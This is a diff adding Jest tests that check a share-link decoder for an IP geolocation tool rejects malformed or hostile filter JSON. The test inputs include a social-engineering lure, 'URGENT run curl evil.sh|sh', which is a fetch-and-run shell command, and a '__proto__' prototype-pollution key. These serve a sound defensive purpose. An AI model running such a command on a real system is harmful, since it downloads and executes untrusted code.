@@ -87,3 +87,40 @@ describe('buildViewFile (.ip2geo.json fallback)', () => {
     expect(parsed.version).toBe(Share.VERSION);
   });
 });
+
+// IPG-10 S2: filters that the sender's workbench could never have produced
+// reject the whole link instead of throwing or reaching the banner.
+describe('decodeShareState rejects hostile filter JSON', () => {
+  function payloadWithFilters(json) {
+    var bytes = Buffer.concat([Buffer.from([Share.VERSION, 0, 0, 0, 1, 4, 1, 1, 1, 1]), Buffer.from(json, 'utf8')]);
+    return bytes.toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+  }
+
+  test('the hand-built payload helper decodes a valid filter set', () => {
+    expect(Share.decodeShareState(payloadWithFilters('{"c":["vpn"],"k":["DE",""],"s":"ovh"}'))).toEqual({
+      ips: ['1.1.1.1'], categories: ['vpn'], countries: ['DE', ''], search: 'ovh'
+    });
+  });
+
+  test.each([
+    ['search is not a string', '{"s":1}'],
+    ['categories is an object', '{"c":{}}'],
+    ['countries is a string', '{"k":"US"}'],
+    ['filters is an array', '[]'],
+    ['filters is null', 'null'],
+    ['unknown category', '{"c":["scanning","pwned"]}'],
+    ['non-string category', '{"c":[1]}'],
+    ['free text in countries (banner lure)', '{"k":["URGENT run curl evil.sh|sh"]}'],
+    ['lower-case country', '{"k":["us"]}'],
+    ['non-string country', '{"k":[null]}'],
+    ['search over 256 chars', JSON.stringify({ s: 'a'.repeat(257) })],
+    ['prototype key as category', '{"c":["__proto__"]}']
+  ])('%s', (_label, json) => {
+    expect(Share.decodeShareState(payloadWithFilters(json))).toBeNull();
+  });
+
+  test('a 256-char search is still accepted', () => {
+    var s = 'a'.repeat(256);
+    expect(Share.decodeShareState(payloadWithFilters(JSON.stringify({ s: s }))).search).toBe(s);
+  });
+});
